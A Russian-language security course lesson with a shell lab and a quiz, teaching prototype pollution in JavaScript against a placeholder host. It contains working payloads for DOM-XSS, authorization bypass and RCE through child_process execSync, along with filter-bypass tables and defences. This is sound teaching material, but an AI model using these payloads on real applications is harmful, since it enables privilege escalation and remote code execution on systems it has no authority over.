---
id: web-prototype-pollution
title: "Prototype pollution в JavaScript"
category: web
parent: web-xss-bypass-advanced
difficulty: hard
order: 3
tags: [prototype-pollution, javascript, dom, rce, nodejs, merge]
prerequisites: [web-xss]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 38
summary: "Как через __proto__/constructor загрязнить прототип Object и дойти до DOM-XSS или RCE на сервере."
lab:
  kind: shell
  title: "Практика: prototype pollution → обход авторизации"
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "Проверь merge: curl -s -X POST https://panel.example/api/settings -H 'Content-Type: application/json' -d '{\"theme\":\"dark\"}'"
    - "Отправь опасный ключ: -d '{\"__proto__\":{\"isAdmin\":true}}'"
    - "Загрязнение записывает isAdmin в Object.prototype — свойство появляется у всех объектов."
    - "Затем открой админку с обычной сессией: curl -s https://panel.example/admin -b 'session=user' > found.txt"

---

## Вопрос, с которого всё начинается

JavaScript — **прототипный** язык: объекты наследуют свойства от общего «прототипа». Почти у каждого объекта `{}` прототип один и тот же — `Object.prototype`. Значит, если записать свойство в этот общий прототип, оно появится у **всех** объектов приложения сразу.

Вопрос: может ли наш ввод записать туда что-то? Да — если приложение неаккуратно «мержит» (сливает) пользовательские данные в объект. Это **prototype pollution**, и сегодня разберём её на одном примере.

## Наш пример

Есть Node-приложение `panel.example`. У него есть эндпоинт обновления настроек, который принимает JSON и сливает его в объект:

```bash
$ curl -s -X POST https://panel.example/api/settings \
  -H 'Content-Type: application/json' -d '{"theme":"dark"}'
{"ok":true}
```

Сервер принял наш JSON и «влил» его в настройки. Такая операция называется **merge** (слияние) — она копирует ключи из одного объекта в другой. Проверим, фильтрует ли он опасные ключи. Отправим ключ `__proto__`:

```bash
$ curl -s -X POST https://panel.example/api/settings \
  -H 'Content-Type: application/json' -d '{"__proto__":{"polluted":"yes"}}'
{"ok":true}
$ curl -s https://panel.example/api/settings | grep polluted
"polluted":"yes"
```

Свойство `polluted` появилось там, где мы его не задавали. Это значит, что `__proto__` не был отфильтрован, и наш ключ записался в `Object.prototype`.

## Шаг 1: почему `__proto__` опасен

Разберём уязвимый код. Типичный «глубокий merge»:

```js
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object') merge(target[key], source[key]);
    else target[key] = source[key];
  }
}
```

Цикл идёт по ключам `source`. Когда ключ — `__proto__`, выражение `target['__proto__']` возвращает **прототип** целевого объекта (тот самый `Object.prototype`), и следующий шаг рекурсии пишет уже туда. После этого **любой** объект `{}` «унаследует» наше свойство.

Ключей для записи несколько:

```javascript
obj.__proto__.polluted = 'yes'              // через __proto__
obj.constructor.prototype.polluted = 'yes'  // через constructor.prototype
{"constructor":{"prototype":{"polluted":"yes"}}}   // в JSON
```

Защиты часто блокируют только `__proto__` и забывают `constructor.prototype` — это самый частый обход.

## Шаг 2: клиентский PP → DOM-XSS

На клиенте загрязнение приводит к **DOM-XSS**. Логика такая: многие библиотеки читают «опции» из прототипа. Если загрязнить `Object.prototype.html`, а потом код сделает `element.innerHTML = opts.html`, — вставится наш HTML.

Проверим в консоли браузера после загрязнения:

```js
Object.prototype.polluted   // "yes"  => загрязнение работает
JSON.stringify({})          // если в выводе чужой ключ — загрязнено
```

Ищем «гаджет» — код, который читает свойство из прототипа и кладёт его в опасный sink (`innerHTML`, `eval`, `srcdoc`, `href`):

```js
const cfg = Object.assign({}, defaults, userInput);
element.innerHTML = cfg.template;   // sink
```

Если `defaults` не задаёт `template`, а мы загрязнили `Object.prototype.template`, то payload:

```
https://panel.example/#__proto__[template]=<img src=x onerror=alert(document.domain)>
```

даст DOM-XSS **без прямого отражения параметра** — фильтры его не поймают.

## Шаг 3: серверный PP → обход авторизации

На сервере (Node.js) загрязнение часто обходит проверки. Отправим:

```bash
$ curl -s -X POST https://panel.example/api/settings \
  -H 'Content-Type: application/json' -d '{"__proto__":{"isAdmin":true}}'
$ curl -s https://panel.example/admin -b 'session=user' -o /dev/null -w '%{http_code}\n'
200
```

Вернулось `200` вместо `403`: код проверял `if (req.user.isAdmin)`, а свойство `isAdmin` теперь «есть у всех» через прототип. Это вертикальная эскалация — мы получили доступ админа, не меняя свою роль.

## Шаг 4: серверный PP → RCE

Дальше — самое серьёзное. Загрязнение опций некоторых библиотек ведёт к **RCE**. Классика — `child_process`:

```bash
$ curl -s -X POST https://panel.example/api/settings -H 'Content-Type: application/json' -d '{
    "__proto__":{"shell":"/proc/self/exe","argv":["node","-e","require(\"child_process\").execSync(\"id\").toString()"]}}'
$ curl -s https://panel.example/api/export
uid=0(root) gid=0(root)
```

Само загрязнение код не выполняет — нужен **триггер**: участок, который вызывает `child_process` и полагается на свойства из прототипа (экспорт данных, конвертация, вызов внешней утилиты). Именно комбинация загрязнения и триггера даёт RCE. Другие серверные гаджеты: `outputFunctionName` в EJS/pug, `compile` в Handlebars. Подробнее — в `web-prototype-pollution-rce`.

## Шаг 5: где искать источник загрязнения

Загрязнение возможно только там, где данные **рекурсивно** вливаются в объект. Источники:

| Источник | Пример | Где |
|----------|--------|-----|
| Query string | `?__proto__[isAdmin]=true` | сервер (`qs`) |
| JSON body | `{"__proto__":{"isAdmin":true}}` | сервер |
| URL fragment | `#__proto__[x]=1` | клиент |
| `window.name` | `name='{"__proto__":...}'` | клиент |
| `postMessage` | `event.data` мержится | клиент |
| localStorage | `JSON.parse` затем merge | клиент |

Опасные функции: `$.extend(true, ...)` (jQuery), `_.merge`/`_.defaultsDeep` (lodash), `merge`, `deepmerge`, а также самописные рекурсивные merge. Всё, что рекурсивно копирует ключи без фильтра `__proto__`, `constructor`, `prototype`, — потенциальный источник.

## Шаг 6: обходы защит

| Защита | Обход |
|--------|-------|
| Блок `__proto__` | `constructor.prototype` |
| Блок обоих | `prototype` через другой путь |
| Проверка только верхнего уровня | вложенность `a[__proto__][x]` |
| Фильтр на клиенте | merge на сервере или через `postMessage` |
| `JSON.parse` reviver | не помогает без явного удаления ключей |

Корректная защита — структурная: `Object.create(null)` или `Map` для объектов, куда мержатся данные; рекурсивный отказ от ключей `__proto__`/`constructor`/`prototype`; `Object.freeze(Object.prototype)`.

Отдельная тонкость — **вложенность**. Фильтр, который проверяет только ключи верхнего уровня, пропускает `{"a":{"__proto__":{"x":1}}}`: до `__proto__` он «добирается» на втором уровне рекурсии. Поэтому защита должна отвергать опасные ключи **на любой глубине**, а не только в корне объекта. То же касается `qs`-парсера: загрязнение может произойти ещё при разборе query-строки, **до** того, как твоя валидация вообще получит объект.

## Шаг 7: как найти гаджет

«Гаджет» — код, читающий свойство из прототипа и использующий его небезопасно. Ищем в JS-бандле:

```bash
$ curl -s https://panel.example/app.js -o app.js
$ grep -nE 'innerHTML|outerHTML|eval|Function\(|srcdoc|insertAdjacentHTML' app.js
```

Затем проверяем, читается ли управляющее этим sink свойство из прототипа. Известные гаджеты: `script.src`, `src`/`href` через jQuery, `template`/`compile` в шаблонизаторах, `srcdoc` в iframe-обёртках; на сервере — `outputFunctionName`, `shell`/`env` у `child_process`.

## Что мы теперь знаем

- JavaScript-объекты наследуют свойства от общего `Object.prototype`.
- Небезопасный merge позволяет записать туда свойство через `__proto__`.
- На клиенте PP → DOM-XSS через гаджет-библиотеки.
- На сервере PP → обход авторизации и (с гаджетом) RCE.
- Ключи: `__proto__`, `constructor.prototype`; защиты часто блокируют только первый.
- Нужен **гаджет** — код, читающий свойство из прототипа и использующий его небезопасно.
- Артефакт — появившееся свойство, обход `403` или вывод `id`.

## На что смотреть дальше

- **Не путай клиентский и серверный PP** — это разные поверхности (DOM-XSS vs логика/RCE).
- **Проверяй все три ключа**, не только `__proto__`.
- **Эффект может быть «отложенным»** — загрязнение проявится в следующем запросе/на другой странице.
- **Ищи гаджет**: само загрязнение бесполезно без кода, который прочитает свойство.
- **`Object.freeze(Object.prototype)`** — корректная защита; проверь, применяется ли она.
- **Не вали прод** — RCE-гаджет может уронить сервис.

## Квиз

Проверь себя.

```quiz
- question: "Что такое prototype pollution?"
  options:
    - "Изменение CSS-прототипа"
    - "Запись свойств в `Object.prototype` через небезопасный merge"
    - "Инъекция в SQL"
    - "Кеширование объектов"
  answer: 1
  explanation: "Через `__proto__`/`constructor.prototype` свойства попадают в общий прототип."
- question: "Какой ключ чаще всего используют для загрязнения?"
  options:
    - "`__init__`"
    - "`__proto__`"
    - "`self`"
    - "`prototype__`"
  answer: 1
  explanation: "`__proto__` указывает на прототип; также используют `constructor.prototype`."
- question: "К чему ведёт клиентский prototype pollution?"
  options:
    - "К RCE на сервере"
    - "К DOM-XSS через гаджет-библиотеки"
    - "К SQL-инъекции"
    - "К утечке TLS-ключей"
  answer: 1
  explanation: "Загрязнённые свойства попадают в `innerHTML`/шаблоны → XSS."
- question: "Как обойти наивный фильтр по строке `__proto__`?"
  options:
    - "Никак"
    - "Через `constructor.prototype`"
    - "Через `toString`"
    - "Через `Object.assign` нельзя"
  answer: 1
  explanation: "Ключ `constructor.prototype` ведёт к тому же прототипу."
- question: "Какая защита от prototype pollution корректна?"
  options:
    - "`Object.freeze(Object.prototype)` и рекурсивная фильтрация ключей"
    - "Отключить HTTPS"
    - "Использовать `eval`"
    - "Убрать cookie"
  answer: 0
  explanation: "Заморозка прототипа и запрет опасных ключей при merge."
```

## Куда дальше

Дальше мы разберём, как загрязнение превращается в **RCE на сервере** — через конкретные гаджеты в EJS, pug и `child_process` (`web-prototype-pollution-rce`). А пока главное запомни: небезопасный merge пишет в **общий прототип**, и это меняет поведение всех объектов приложения.

## Где пригодится

- **CTF (Web):** PP часто совмещают с DOM-XSS или обходом авторизации в Node-задачах.
- **Bug bounty:** серверный PP в Node.js-приложениях — высокооплачиваемый класс, особенно с RCE-гаджетом.
- **Пентест:** тестирование PP входит в проверку SPA и Node-бэкендов.
- **Работа (AppSec/Dev):** ревью merge/parse-функций и запрет `__proto__` — базовая защита JS-кода.
